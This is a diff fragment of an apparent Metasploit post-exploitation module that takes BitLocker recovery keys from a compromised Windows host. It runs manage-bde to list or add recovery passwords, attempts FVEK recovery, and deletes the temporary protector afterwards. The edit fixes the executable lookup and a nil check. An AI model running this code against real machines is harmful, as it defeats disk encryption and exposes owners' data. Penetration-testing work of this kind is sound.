@@ -74,8 +74,15 @@ class Metasploit3 < Msf::Post
     else
       print_status('Trying to gather a recovery key')
 
-      cmd_out = cmd_exec("#{system_root}\\sysnative\\manage-bde.exe",
-                         "-protectors -get #{drive_letter}:")
+      manage_bde = "#{system_root}\\system32\\manage-bde.exe"
+      unless exist?(manage_bde)
+        manage_bde = "#{system_root}\\sysnative\\manage-bde.exe"
+        unless exist?(manage_bde)
+          fail_with(Failure::Unknown, 'manage-bde.exe not found')
+        end
+      end
+
+      cmd_out = cmd_exec(manage_bde, "-protectors -get #{drive_letter}:")
 
       recovery_key = cmd_out.match(/((\d{6}-){7}\d{6})/)
 
@@ -84,7 +91,7 @@ class Metasploit3 < Msf::Post
         print_good("Recovery key found : #{recovery_key}")
       else
         print_status('No recovery key found, trying to generate a new recovery key')
-        cmd_out = cmd_exec("#{system_root}\\sysnative\\manage-bde.exe",
+        cmd_out = cmd_exec(manage_bde,
                            "-protectors -add #{drive_letter}: -RecoveryPassword")
         recovery_key = cmd_out.match(/((\d{6}-){7}\d{6})/)
         id_key_tmp = cmd_out.match(/(\{[^\}]+\})/)
@@ -114,9 +121,9 @@ class Metasploit3 < Msf::Post
         print_bad('Failed to generate FVEK, wrong recovery key?')
       end
     ensure
-      unless id_key_tmp
+      unless id_key_tmp.nil?
         print_status('Deleting temporary recovery key')
-        cmd_exec("#{system_root}\\sysnative\\manage-bde.exe",
+        cmd_exec(manage_bde,
                  "-protectors -delete #{drive_letter}: -id #{id_key_tmp}")
       end
       client.railgun.kernel32.CloseHandle(@handle)
